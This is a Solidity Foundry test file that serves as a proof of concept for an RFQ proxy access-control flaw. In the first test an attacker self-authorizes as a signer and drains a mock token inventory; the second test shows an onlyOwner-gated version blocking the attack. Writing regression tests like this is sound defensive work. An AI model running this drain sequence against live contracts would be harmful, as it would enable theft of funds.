// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20, VulnerableRfq, SafeRfq} from "../src/rfq/RfqProxy.sol";

/// PoC for the TrustedVolumes RFQ access-control failure (~$6.7M, 2026-05-06).
///   forge test --match-contract TrustedVolumesAccess -vvv
///
/// Invariant (SC01): only an admin-controlled address may modify the authorized-signer allow-list.
/// The vulnerable proxy lets anyone authorize themselves and then sign draining orders; gating the
/// setter with onlyOwner holds.
///
/// See docs/exploits/trustedvolumes-rfq-2026-05-06.md
contract TrustedVolumesAccessTest is Test {
    MockERC20 token;
    address deployer = makeAddr("deployer");
    address attacker;
    uint256 attackerPk;
    address legitSigner;
    uint256 legitPk;

    function setUp() public {
        token = new MockERC20();
        (attacker, attackerPk) = makeAddrAndKey("attacker");
        (legitSigner, legitPk) = makeAddrAndKey("legitSigner");
    }

    function _sign(uint256 pk, address proxy, address to, uint256 amountOut, uint256 nonce)
        internal
        pure
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        bytes32 h = keccak256(abi.encodePacked(proxy, to, amountOut, nonce));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (v, r, s) = vm.sign(pk, ethHash);
    }

    function test_vulnerable_attackerSelfAuthorizesAndDrains() public {
        vm.prank(deployer);
        VulnerableRfq proxy = new VulnerableRfq(IERC20(address(token)));
        token.mint(address(proxy), 1_000_000e18); // RFQ inventory

        // Attacker authorizes their own address as a signer — no access control stops them.
        vm.prank(attacker);
        proxy.setAuthorizedSigner(attacker, true);

        // Attacker signs an order paying the whole inventory to themselves, then executes it.
        (uint8 v, bytes32 r, bytes32 s) = _sign(attackerPk, address(proxy), attacker, 1_000_000e18, 0);
        proxy.executeSwap(attacker, 1_000_000e18, 0, v, r, s);

        assertEq(token.balanceOf(attacker), 1_000_000e18, "attacker drained the inventory");
        assertEq(token.balanceOf(address(proxy)), 0, "proxy emptied");
    }

    function test_safe_onlyOwnerManagesSigners() public {
        vm.prank(deployer);
        SafeRfq proxy = new SafeRfq(IERC20(address(token)));
        token.mint(address(proxy), 1_000_000e18);

        // Attacker cannot self-authorize.
        vm.prank(attacker);
        vm.expectRevert(bytes("not owner"));
        proxy.setAuthorizedSigner(attacker, true);

        // An order signed by the unauthorized attacker is rejected.
        (uint8 v, bytes32 r, bytes32 s) = _sign(attackerPk, address(proxy), attacker, 1_000_000e18, 0);
        vm.expectRevert(bytes("unauthorized signer"));
        proxy.executeSwap(attacker, 1_000_000e18, 0, v, r, s);

        // The legitimate flow still works: owner authorizes a real signer, whose order fills.
        vm.prank(deployer);
        proxy.setAuthorizedSigner(legitSigner, true);
        (v, r, s) = _sign(legitPk, address(proxy), deployer, 100e18, 1);
        proxy.executeSwap(deployer, 100e18, 1, v, r, s);

        assertEq(token.balanceOf(deployer), 100e18, "authorized order fills");
        assertEq(token.balanceOf(address(proxy)), 1_000_000e18 - 100e18, "only the authorized fill left");
    }
}
